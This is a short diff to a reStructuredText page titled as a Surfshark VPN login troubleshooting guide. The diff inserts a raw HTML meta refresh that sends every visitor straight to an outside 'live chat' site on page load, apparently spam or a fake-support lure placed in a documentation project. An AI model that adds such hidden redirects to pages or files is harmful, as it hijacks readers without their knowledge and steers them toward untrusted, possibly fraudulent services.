@@ -1,3 +1,9 @@
+
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://accuratelivechat.com/">
+
+
 Surfshark VPN Login Account Not Working? Here’s How to Fix It 
 ============================================
 
